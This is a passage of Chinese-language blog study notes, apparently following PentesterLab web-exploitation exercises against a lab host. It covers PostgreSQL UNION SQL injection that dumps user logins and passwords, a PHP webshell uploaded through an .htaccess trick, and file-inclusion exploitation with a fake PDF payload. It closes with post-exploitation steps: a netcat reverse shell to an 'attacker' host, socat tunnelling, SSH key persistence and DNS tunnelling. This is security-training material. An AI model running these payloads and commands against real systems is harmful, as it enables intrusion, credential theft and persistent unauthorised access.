PostgreSQL 。 相比于MySQL，PostgreSQL多需要一步使得到的 UNION 语句正常工作：列需要的两个查询必须是由第一个查询决定类型之间的同类型。如果我们使用之前发现的语句 1 UNION SELECT 1,2,3,4 ，可以看到下面的错误信息显示： 1Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched 为了避免这个错误，我们可以用 null,null,null,null 来代替 1,2,3,4 ，不会产生任何错误。现在我们可以找出哪些列是一个字符串（因为大多数的我们想要的信息将基于字符串并且很容易转换任何值为字符串）。要做到这一点，我们只需要尝试每一列一个接一个相互，看看哪一个不返回一个错误： 1 UNION SELECT &#39;aaaa&#39;,null,null,null ：该测试返回消息：invalid input syntax for integer ，这可能是一个整数列。 1 UNION SELECT null,&#39;aaaa&#39;,null,null ：不返回一个错误，我们可以使用这一列，我们可以在页面中看到字符串 aaaa。 1 union select null,null,&#39;aaaa&#39;,null ：不返回一个错误，我们可以用这一列，结果是不可见的在网页中，在页面的源中可见（在 &lt;img 标签中）。 1 union select null,null,null,&#39;aaaa&#39; ：该测试返回消息：invalid input syntax for integer ，这可能是一个整数列。 利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息： 用PHP应用程序连接到数据库的用户使用 current_user 数据库版本使用 version() 例如你可以访问以下URL获取这些信息： 数据库版本：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,version(),null,null 当前用户：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_user,null,null 当前数据库：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_database(),null,null 我们现在能够从数据库中检索信息和检索任意内容。为了获取当前应用程序相关的信息，我们需要： 当前数据库中的所有表的名称 我们要从中检索信息的表的列名 PostgreSQL提供了包含有关数据库、表、列的元信息表。我们将使用这些表来获取我们需要的信息来构造最终请求。 以下查询可用于检索： 所有表的列表：SELECT tablename FROM pg_tables 所有列的列表：SELECT column_name FROM information_schema.columns 通过混合这些查询和以前的URL，你能猜出信息检索的访问链接： 表的列表：1 UNION SELECT null,tablename,null,null FROM pg_tables 列的列表：1 UNION SELECT null,column_name,null,null FROM information_schema.columns 问题是，这些请求，为您提供一个所有的表和列的原列表，但查询数据库和检索感兴趣的信息，你需要知道什么列是属于什么表。幸好，information_schema.columns stores表中存储有表名： 1SELECT table_name,column_name FROM information_schema.columns 要获取这些信息，我们可以： 把表名和列名放在不同的注入位置：1 UNION SELECT null, table_name, column_name,null,null FROM information_schema.columns 把表名和列名放在同一个注入位置，使用级联符号（||）分隔：1 UNION SELECT null,table_name||&#39;:&#39;|| column_name,null,null FROM information_schema.columns 。：可以很容易的分割查询结果。 利用这些信息，你现在可以创建一个查询，从表中检索信息： 11 UNION SELECT null,login||':'||password,null,null FROM users; 然后获取用户名和密码用来访问管理页面。 该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user)…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。 破解密码使用在”From SQLInjection to Shell“中描述的方法可以很容易破解密码。 上传webshell并且执行代码传统的webshell一旦进入管理页面，下一个目标是找到一种方法，在操作系统上执行命令。 我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器将给我们一种方式来运行PHP代码和命令。 首先我们需要创建一个PHP脚本来运行命令。下面是一个简单的和最小的webshell的源代码： 123&lt;?php system($_GET['cmd']);?&gt; 这个脚本获取参数cmd的内容并且执行它。它需要被保存为一个.php扩展名的文件，例如shell.php可以被用作文件名。 我们现在可以使用在网页的上传功能：http://vulnerable/admin/new.php尝试上传这个脚本。 我们可以看到，脚本没有被正确上传到服务器上。应用阻止文件扩展名.php上传。我们可以尝试.php3，.php.test……不幸的是这些名字都不工作。 我们需要找到另一种方式来获得命令的执行。 .htaccess介绍.htaccess是用来执行每次修改Apache配置。他们可以是非常危险的如果你可以上传一个并且得到由服务器解释。 获取命令执行的最常见的方式是有一个任意的扩展处理程序： 1AddType application/x-httpd-php .blah 这一行将告诉Apache的解释.blan文件使用PHP引擎。因为.blan文件看起来不像被应用程序过滤。 这个工作了因为 AllowOverride被设置为All（它的默认值），这意味着如果服务器遇到.htaccess文件将解释它。 一旦我们上传了包含以上内容的.htaccess文件。我们现在可以重命名文件 shell.php 到 shell.blan 然后上传它。 一旦这两个文件上传，我们可以得到命令的执行 获得代码执行现在，我们需要找到我们的脚本，管理上传放在Web服务器上的文件。我们需要确保该文件是直接可用的Web客户端。我们可以参观新上传的图像的网页，看到 img 标记指向： 123456789&lt;div class&#x3D;&quot;content&quot;&gt; &lt;h2 class&#x3D;&quot;title&quot;&gt;Last picture: Test shell&lt;&#x2F;h2&gt; &lt;div class&#x3D;&quot;inner&quot; align&#x3D;&quot;center&quot;&gt; &lt;p&gt; &lt;img src&#x3D;&quot;admin&#x2F;uploads&#x2F;shell.blah&quot; alt&#x3D;&quot;Test shell&quot; &#x2F;&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; 你现在可以访问页面在以下地址并且运行命令使用cmd参数。例如：访问http://vulnerable/admin/uploads/shell.blah?cmd=uname将运行命令 uname 在操作系统上并且返回当前系统内核（Linux）。 其他命令可以用来获取更多信息： cat /etc/passwd 来获得系统的完整的用户列表； uname -a 来获得当前内核版本； ls 来获得当前目录内容； … 像以前一样，我们的webshell具有和Web服务器上运行PHP脚本相同的权限，例如你不可以检索文件 /etc/shadow 的内容因为Web服务器没有访问此文件的权限（但你还是应尽可能尝试假设管理员错误地修改了权限）。 每个命令都是运行在一个全新的上下文独立的前面的命令，你将无法通过运行 cd /etc 和 ls 得到 /etc/ 目录的内容，因为第二命令将在一个新的上下文。获取目录 /etc/ 内容，您将需要运行ls /etc/。 总结这次练习教你如何手动检测和利用SQL注入PostgreSQL数据库访问到管理页面。一旦在“信任区”，更多的功能通常是可用的，将可能会导致更多的漏洞。这是基于一个几年前一个网站进行渗透测试的结果，但这类漏洞的网站今天仍在互联网存在。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"PHP Include And Post Exploitation","slug":"PHP-Include-And-Post-Exploitation","date":"2015-03-26T07:29:04.000Z","updated":"2019-09-03T07:30:50.763Z","comments":true,"path":"2015/03/26/PHP-Include-And-Post-Exploitation/","link":"","permalink":"https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/","excerpt":"","text":"简介本课程详细讲解了发现和利用一个有限制的环境中的PHP漏洞。然后介绍了post漏洞利用的基础，shell，反向shell和TCP重定向。 攻击分为三个步骤： 指纹识别：收集Web应用使用的技术信息。 检测和利用PHP包含漏洞：在这一部分中，您将学习PHP包含漏洞的工作原理以及如何利用它来获取代码执行。 Post漏洞利用：访问操作系统，获得shell并且执行TCP重定向到其他服务。 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。 检查HTTP标头大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取： 1$ telnet vulnerable 80 PS： vulnerable是主机名或服务器的IP地址； 80是由Web应用程序使用的TCP端口（80是HTTP默认值）。 通过发送以下HTTP请求： 12GET / HTTP/1.1Host: vulnerable 它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头： 12345678910HTTP/1.1 200 OKDate: Tue, 10 Apr 2012 04:24:16 GMTServer: Apache/2.2.16 (Debian)X-Powered-By: PHP/5.3.2Vary: Accept-EncodingContent-Length: 2065Content-Type: text/html&lt;html&gt; &lt;head&gt; 这里的应用程序通过HTTP。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用 openssl 工具： 1$ openssl s_client -connect vulnerable:443 PS： vulnerable是主机名或服务器的IP地址； 443是由Web应用程序使用的TCP端口（443是HTTPS的默认值） 使用应用程序如Burp Suite（http://portswigger.net/）设置为代理可以很容易地获取相同的信息。 使用NiktoNikto工具（http://cirt.net/nikto2）可用于收集远程服务器上的信息。Nikto检查已知的漏洞路径并且检查HTTP标头。这是一个特别有用的工具，在旧系统中找到漏洞（Lotus Domino, IIS4, …）。下面的命令可以执行扫描远程服务器： 1234567891011121314151617181920212223242526$ perl nikto.pl -h http://vulnerable/- Nikto v2.1.4---------------------------------------------------------------------------+ Target IP: 192.168.0.21+ Target Hostname: vulnerable+ Target Port: 80+ Start Time: 2012-04-11 14:12:45---------------------------------------------------------------------------+ Server: Apache/2.2.16 (Debian)+ Retrieved x-powered-by header: PHP/5.3.2+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.+ /index.php?page=../../../../../../../../../../etc/passwd: PHP include error may indicate local or remote file inclusion is possible.+ /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.+ OSVDB-3126: /submit?setoption=q&amp;option=allowed_ips&amp;value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-3092: /login/: This might be interesting...+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3268: /images/: Directory indexing found.+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ 4103 items checked: 0 error(s) and 13 item(s) reported on remote host+ End Time: 2012-04-11 14:13:01 (16 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 我们可以看到Nikto找到了一些问题： Apache和PHP版本； 一个潜在的PHP包含问题； 假积极性（OSVDB-3126）； PHP的复活节彩蛋是可用，PHP配置 exposed_php 开启状态（OSVDB-12184）； 一些目录可以索引； 登陆页。 检测和利用 PHP 文件包含漏洞PHP文件包含漏洞介绍之前，开发者使用服务器端包含来复制在许多网页中相同的信息，保持在只有一个地方（避免代码重复和耗时的更新）。当开发人员开始使用PHP，他们开始使用PHP函数 include 和 require （部分较聪明的使用 include_once 和 require_once ）执行同样的事情。该代码是包含到当前页面并且解释作为它的一部分。 只要人们使用一个恒定的路径在 include 或 require 中，没有任何安全的隐患。然而，一些开发者在这里使用了在用户的控制下的路径。这可能导致文件包含。如果有人可以决定哪些文件被包含和解释，他可以通过控制他的文件并且强制服务器解释任意代码。 如果，你在执行代码审查，脆弱的PHP代码看起来类似于这种： 1234&lt;?phpinclude(\"header.php\");include($_GET[\"page\"]);?&gt; 第一行用于包括header.php并不脆弱因为第一行的值header.php不是由用户控制。 然而，在第二行，由用户提供的值（$_GET[“page”]）是直接使用，没有任何过滤或预处理。这是一个典型的文件包含。 有两种典型的文件包含： 本地文件包含， 远程文件包含。 他们都来自同一个问题（使用用户的输入包含一个文件），唯一的区别是他们可以利用的途径。一个远程文件包含可以通过使用任何资源来利用，而本地文件包含只能使用本地资源来利用。 PHP文件包含检测本地文件包含的检测类似于目录遍历，因为我们是在玩一个路径。我们知道，PHP脚本使用用户提供的值并且使用它作为一个包含文件的路径，但是所提供的值可以通过PHP代码修改： 父目录可以添加：include(“includes/“.$_GET[“page”]); ； 文件扩展名可以添加：include($_GET[“page”].”.php”); ； 值可以被净化：include(basename($_GET[“page”])); ； 之前所有的操作都可以执行：include(“includes/“.basename($_GET[“page”]).”.php”); 。 这些修改将修改这一问题的检测和利用。 PHP提供了对远程文件的保护包括（allowurlinclude 在PHP配置文件中）。这种配置也会修改Web应用中检测和利用PHP文件包含的行为。 最简单的方法是测试包含路径，将生成错误消息。 你可以先尝试包含一个不存在的文件：例如 pentesterlab123randomvalue 是不可能存在的；；你可以用它来看看有什么消息被应用程序发送回来。我们可以看到下面的错误消息被抛出： 123&lt;b&gt;Warning&lt;&#x2F;b&gt;: include(pentesterlab123randomvalue.php) [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt; &lt;b&gt;Warning&lt;&#x2F;b&gt;: include() [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: Failed opening &#39;pentesterlab123randomvalue.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; 这个错误信息给了我们需要在漏洞利用时使用的重要信息： 1Failed opening &#39;pentesterlab123randomvalue.php&#39; for inclusion 由于我们使用的字符串 pentesterlab123randomvalue ，我们可以猜测后缀名 .php 是被PHP代码添加的。 我们可以尝试访问一个没有权限的文件：例如访问 /etc/shadow 将有可能因为当前网络服务器的用户没有权限而产生一个异常。然而，由于PHP代码添加了后缀名 .php ，我们需要添加一个空字节（编码为 %00 ）来绕过它并且访问页面 http://vulnerable/index.php?page=../../../../../etc/shadow%00。你可以使用很多 ../向上访问文件系统中的 shadow文件。下面的错误信息显示： 1&lt;b&gt;Warning&lt;/b&gt;: include(../../../../../etc/shadow) [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: failed to open stream: Permission denied in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; 我们可以看到，我们有一个不同的错误信息：Permission denied 并且我们的空字节技巧生效了，因为PHP尝试包含文件../../../../../etc/shadow 。 你可以尝试用文件 /etc/passwd 使用同样的把戏（../ 和空字节），你应该能访问到文件内容： 你可以修改请求的值从字符串到数组；这可能会影响到PHP的行为。例如，修改参数 page=login 到 page[]=login ，下面的错误信息被抛出： 12&lt;b&gt;Warning&lt;&#x2F;b&gt;: include(Array.php) [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt;&lt;b&gt;Warning&lt;&#x2F;b&gt;: include() [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: Failed opening &#39;Array.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; 我们可以看到，提供的值已经被改变成了数组因为PHP将它作为一个字符串转换了。 检查的另一种方法是使用不同的值观构建相同的路径。例如，以下路径：classes/../login ，./login 和 login 匹配相同的文件。Windows和Unix目前对于路径管理的主要区别，假如你尝试访问 classes/../login 并且存储库类不存在，Linux/Unix将抛出一个错误，而Windows将忽略这个问题，显示正确的页面。 你可以使用另一个Web服务器测试远程文件访问，然而，它只会工作在以下情况下： 如果PHP配置允许远程文件包含； 如果Web服务器访问远程服务器可以被防火墙阻止，缺少DNS解析（可以使用IP地址来绕过），通过Web代理服务器或通过网络（例如，你的测试环境中没有互联网接入）。 例如，你可以访问以下URL尝试包含谷歌主页：http://vulnerable/index.php?page=http://www.google.com/? URL末尾的？用来确保任何添加到URL的扩展或后缀将被谷歌的服务器解释为一个参数。脆弱的系统没有配置允许远程文件包含，显示如下错误信息： 12345&lt;br /&gt; &lt;b&gt;Warning&lt;/b&gt;: include() [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: URL file-access is disabled in the server configuration in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: include(http://www.google.com/?.php) [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: failed to open stream: no suitable wrapper could be found in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; &lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: include() [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: Failed opening 'http://www.google.com/?.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; 如果PHP配置允许远程包含，这是一个例子，我们看到了什么： 我们可以看到“正常”的页面并且谷歌网页已经被包含进来了。 从这个测试中，我们可以猜出： 有一个本地文件包含漏洞； 一个.php扩展被添加到提交的值后面。 PHP文件包含利用与SQL注入（盲注和非盲注）类似，你可以首先尝试包括远程文件，如果它不工作，你需要使用一个本地文件包含。 远程文件包含利用利用远程文件包含，你只需要安装一个Web服务器来运行你的PHP代码。PHP代码是一个简单的webshell： 123&lt;?php system($_GET[\"cmd\"]);?&gt; 你需要使用一个不会被你的服务器解析成PHP文件的扩展名来保存这个文件来确保脆弱的服务器收到的是PHP代码而不是PHP代码的执行结果。例如你可以使用扩展名： .txt 。然后你可以包含文件并指定要运行的命令去访问页面：http://vulnerable/index.php?page=http://yourserver/webshell.txt&amp;cmd=ifconfig 如果你访问这个页面（配置允许远程文件包含），下面的步骤会发生： PHP脚本将检索文件 webshell.txt ； PHP脚本将开始解释代码； PHP脚本将使用URL中所提供的cmd的值（注：值是提供给脆弱的服务器不是你的服务器）； 提供的命令将被执行； 服务器将发送回命令的结果。 正如我们之前所说的，脆弱的系统是不存在远程文件包含，这种方法不会在当前的设置下工作。 本地文件包含利用有很多方法可以利用一个本地文件包含，它们都是基于相同的方法：你需要找到一个办法把PHP代码放入在系统上的文件，然后包含代码。 可以使用下列方法： 在日志中注入PHP代码：例如，一个Web服务器，通过访问的URL（路径包含PHP代码），然后包含Web服务器的日志。 在一封电子邮件中注入PHP代码，通过发送电子邮件，然后包括电子邮件（在`/var/spool/mai）。 上传一个文件，包含它，例如你可以上传一个图像并把你的PHP代码写在图像的注释部分（因此不会修改图像大小）。 上传PHP代码通过另一个服务：FTP，NFS，… … 注入到日志应该是你最后的解决方案，如果你没有正确地使用PHP语法（正确的PHP代码和正确的HTTP编码）在第一次尝试，你将不得不等待日志替换。 在这里我们可以看到，该应用程序允许用户上传一个介绍为“征文”。我们将使用此功能来上传我们的PHP代码。 为了测试这个上传功能，我们需要检查： 可以上传的文件扩展名； 可以上传的内容类型。 检查扩展可以很容易地通过重命名PDF文件到一个PHP文件做尝试上传。如果文件扩展名的PDF文件是可接受的，很可能是没有控制文件扩展名。 一些PHP开发者的信任值由HTTP协议在多部分消息，只检查值为$_FILES[&#39;file&#39;][&#39;type&#39;]。这个值是由客户端控制，可以使用代理服务器很容易修改。 对于内容类型，我们只需要工作在其他方式，我们可以创建一个txt文件，重命名为file.pdf。如果应用程序接收文件，则没有过滤内容类型。 在这里我们可以看到，通过之前的方法测试，扩展名和内容类型都被上传脚本检查。 利用这个问题，我们将需要一个有效的PDF文件包含PHP代码。 我们可以使用下列方法之一： 采取任何PDF并且增加我们的PHP的有效载荷； 创建一个PHP文件看起来像一个PDF，并将绕过内容类型检查。 第一种方法可能会造成一些问题取决于文件内容（因为有些字符不能正确支持在包含中）和可能不工作。第二种方法是安全的，为什么我们要用它。 如果你打开一个PDF文件，你可以看到第一行看起来像： 12$ head -n 1 sample.pdf%PDF-1.4 如果你使用函数 mime_content_type （大部分PHP开发者用它来检查文件类型），你可以看到，只有以下需要： % pdf-1.4 （或不同的版本）。 基于这些信息，我们可以创造我们的假PDF文件： 1234%PDF-1.4&lt;?php system($_GET[\"cmd\"]);?&gt; 然后使用PDF扩展名命名它（例如 lfi.pdf ）。如果你的PHP安装在您的系统（命令行解释器），您可以快速检查文件是否被认为是一个PDF通过使用下面的代码： 123&lt;?phpecho mime_content_type('lfi.pdf') . \"\\n\";?&gt; 然后运行它： 12$ php content-type.phpapplication/pdf 我们现在有一个有效的PDF包含PHP的有效载荷。 一旦我们把我们的文件上传，我们需要包含它，为了得到这方面的信息，可以登录电子邮件和密码设置，看到有一个链接到我们上传的文件。 我们已经知道了文件被上传，我们可以包含它。然而，我们需要有一个空字节来摆脱被合法的PHP代码添加的扩展名。PHP 5.3.4之后不能使用零字节的技巧摆脱扩展名做本地文件包含。我们可以访问以下页面获取命令执行：http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=uname 注： page参数是我们上传的文件名，添加一个空字节； cmd是我们要运行的命令。 我们可以在包含文件页面看到PDF-和命令的结果： 1%PDF- Linux Shell与反向Shell后续利用介绍后续利用允许你更好的访问系统。有一个webshell是第一步，然而，对于每个命令你将需要发送一个HTTP请求并等待结果。此外，如果你试着用 cd .. 移动到父目录，你会看到下一个命令仍将运行在相同的目录：每个请求都是完全独立于前一个。 为了绕过这些限制，我们将需要得到一个“真正”的shell在远程操作系统上。 Shell与反向Shell有两种方法得到远程服务器上的shell，你可以获得命令执行： 使用shell：你将绑定一个shell到一个TCP端口（step1）。然后你就可以连接它运行命令（step2）。 使用反向shell：你可以在你的本地系统绑定一个端口（step1），在服务器端连接到这个端口并且重定向输入和输出到一个shell。然后你就可以运行命令。 在大多数系统（包括脆弱的系统），你将能够绑定一个端口（只要你选择1024的端口，因为这是一个Unix系统），但是很可能你将无法访问它（因为你和易受攻击的服务器之间的防火墙）。这就是为什么大多数的时间，绑定shell到端口不能解决问题。 因为防火墙更容易过滤入站流量相比于出站流量，这是更可能是一个反向shell正常工作。此外，您可以使用特权端口（如TCP／80或TCP／443）只要你在系统中有充分的权限。 使用反向shell连接我们需要确保netcat在双方系统都是可用的。 在您的本地系统，你可以很容易地安装它，因为你有充分的机会。根据你的操作系统，你将需要： 从Nmap项目中安装ncat（http://nmap.org/ncat/）如果你使用Windows。 从Nmap项目中安装ncat（http://nmap.org/download.html#macosx）如果你使用Mac OS。 在Fedora中安装nmap并且使用 ncat 。 在Debian中安装nmap并且使用 netcat 。 有不同版本的netcat存在并且其中一些不支持 -e参数。确保你使用的版本支持此参数。 在远程服务器上已经安装有netcat。如果没有，你可以使用下面的方法： 添加 %PDF-1.4 到文件第一行并且使用合法的上传脚本； 使用wget从远程服务器下载。 对于这两种方法，您将需要有一个版本的nc针对目标操作系统的体系结构编译（最有可能是一个静态二进制文件）。 对于第一种方法，如果你是一个Unix系统（Linux，Mac或*BSD），你可以： 添加一个PDF文件头： 12$ echo \"%PDF-\" &gt; pdfheader$ cat pdfheader nc &gt; nc.pdf 上传你创建的服务器文件。从文件中提取二进制文件使用文件包含漏洞： 1$ tail -n +2 nc.pdf &gt; nc 对于第二种方法，你只需要下载nc从远程服务器使用包含漏洞。 在被感染的系统上运行命令，我们将使用本地文件包含漏洞。我们需要遵循这些步骤： 在本地操作系统使用netcat绑定一个端口（nc或netcat，取决于你的系统）： 1$ sudo nc -l -p 80 使用我们的webshell运行netcat影响服务器通过访问以下URL：（http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=nc%20attacker%2080%20-e%20/bin/bash）对应的命令： 1$ nc attacker 80 -e /bin/bash attacker是你的Ip地址。 使用sudo（或root权限）允许我们绑定80端口，该端口不能被视为一个普通用户。端口80（HTTP）是不太可能被封锁。以下端口也可以尝试：21，53，443。 然后你可以运行命令（uname或id为例）在本地的nc： 12345$ sudo nc -l -p 80unameLinuxiduid=33(www-data) gid=33(www-data) groups=33(www-data) 通过socat进行TCP重定向我们现在有一个shell，但它会变得更好如果有一个真正的shell（比如支持Ctrl-C），可以轻松地复制和检索文件例如使用SSH。 要做到这一点，我们需要使用socat（http://www.dest-unreach.org/socat/）。socat可能是日常系统管理和入侵的最有用的网络工具之一。 你可以找到一些Windows版本在互联网上，但它可能是更好的使用你自己编译的版本，或者你使用一个虚拟Linux系统。 因为这个脆弱的系统是防火墙，我们将使用一个反向连接告诉socat重定向所有流量从我们的系统到一个本地端口。 在这个例子中，我们将尝试访问本地SSH服务器上可用的端口22，使用重定向到我们在本地系统的2222端口。下面的图显示了两个系统之间的网络流： 正如你所看到的，唯一需要的权限在攻击者的一面，允许我们使用这种技术通过低特权帐户。 首先，我们需要把我们的本地端口2222（我们将在之后访问）和将访问的脆弱的服务器端口（端口443来避免防火墙，因为80端口已经被使用）绑定起来： 1attacker $ sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 443端口需要在第一个位置，因为它是脆弱的服务器将尝试连接到的端口。限制访问本地端口，不允许任何人在我们的网络访问端口443和服务器上的远程端口重定向，选项可以使用绑定范围。 在远程服务器上，我们需要做到以下几点： 1vulnerable $ while true; do socat TCP4:attacker:443 TCP4:127.0.0.1:22 ; done attacker 是你的IP地址。 别忘了杀掉循环当你不需要重定向的时候。 我们可以尝试SSH到远程系统： 1attacker $ ssh localhost -p 2222 然而，我们无法连接，因为我们不知道 www-data 的密码。 要获得SSH访问，我们将需要设置一个远程服务器上的SSH密钥。 1attacker $ ssh-keygen -P \"\" -f vulnerable 注： -P 表示一个空的密码； -f 表示文件名。 两个文件将被创建：vulnerable 和 vulnerable.pub 我们可以使用前面上传netcat（或任意文件）的方法之一来上传公钥文件到脆弱的系统上。为此，我们需要停止socat和netcat。因为公钥文件不是二进制文件，我们只能通过一个新的netcat的shell把文件复制过去。你需要重新运行一个监听netcat在端口80（sudo ncat -l -p 80）然后你可以上传公钥文件。 1234567attacker $ sudo ncat -l -p 80iduid=33(www-data) gid=33(www-data) groups=33(www-data)grep www-data /etc/passwdwww-data:x:33:33:www-data:/var/www:/bin/shmkdir ~www-data/.sshecho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzERqIb6v4mbrkV6xdlqsDMo/sBy3sA9SMOpBJI6DRHmy9Y6ilSlv7UGHzg9dDOhqxis/RVcGBQP2eceNOUvBY24yRD8R31p73AilUwhdvRm8XhRszaXciskSBTjLQMY9Iw8poDNZFZZqIkhWq6ZMIUdv0PfVouC0UXJBYq3AQIJLKSlJSy/DyrORUY7kLf5h3oyk1KlWGKdZ1duZeYwz7Qc2kHHw3TpsckhyS0VaeZ6V3Rk4pNVIaUxOCENP+hNDWQWpkvPKXPjvr4tYS1kzs+TVi79z76yV61KmwZDLwPse3DBUSXakCSDoPI20C2SIGWjqI7QrjtM/SQe19N8f9 attacker\" &gt;&gt; ~/.ssh/authorized_keys 现在，一切工作正常，我们可以重新启动socat的进程。（注：重启本地socat并且重新运行在脆弱的系统上的socat命令）并且连接到之前socat创建的连接。 12345678910attacker $ ssh localhost -p 2222 -l www-data -i vulnerable Linux debian 2.6.32-5-amd64 #1 SMP Thu Mar 22 17:26:33 UTC 2012 x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.$ 注： -p 2222 是通过SSH转发的端口； -l www-data 表明我们将要使用的用户的名称（可以使用netcat的shell的命令id得到这个值）； -i vulnerable 是私钥文件。 一旦我们有了SSH访问远程服务器，现在我们可以很容易地使用SSH进行端口重定向，例如访问本地MySQL服务器。 1attacker $ ssh localhost -p 2222 -l www-data -i vulnerable -L 13306:localhost:3306 然后你可以检查您使用SSH重定向访问的MySQL（在您的本地系统）：MySQL客户端： 1attacker $ mysql -h localhost -u root -P 13306 telnet去看MySQL服务端的banner： 1attacker $ telnet localhost 13306 SSH允许我们使用其他工具如sshfs挂载影响服务器的文件系统，或使用这个服务器作为socks代理访问其他内部服务器（使用 ssh -D）或运行X11应用。 DNS隧道不幸的是，一个简单的虚拟系统不提供我们的架构设置这种喷出方法，但最好要知道它能做的这些。 当入站和出站流量完全过滤，你仍然可以使用DNS隧道（如果DNS请求“互联网”是允许的）。可以使用的工具 dns2tcp 。 下面的图表说明了DNS隧道工作情况： 让我们说，客户想发送字符串AAAA到服务器，它将发送一个DNS请求到 aaaa.pentesterlab.com ，此DNS请求将被转发到客户端的DNS服务器和所有的服务器，直到达到DNS服务器 pentesterlab.com 。这样的字符串AAAA已通过所有的DNS服务器到服务器。然后服务器要返回字符串 BBBB 到客户端，它将使用合法的DNS响应并且信息将向客户传递后被所有DNS服务器发送请求时使用。 DNS隧道是绕过安全限制的最热点的一种简易方法。 在这里，被入侵的系统将作为dns2tcp客户端，它会发送一个请求来检索它需要运行的命令，一旦收到响应，它会运行命令并发送结果到服务器。 例如，让我们使用带d.pentesterlab.com作为我们的dns2tcp服务器。我们将运行以下命令： 在受感染的系统上； 在服务器上。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell 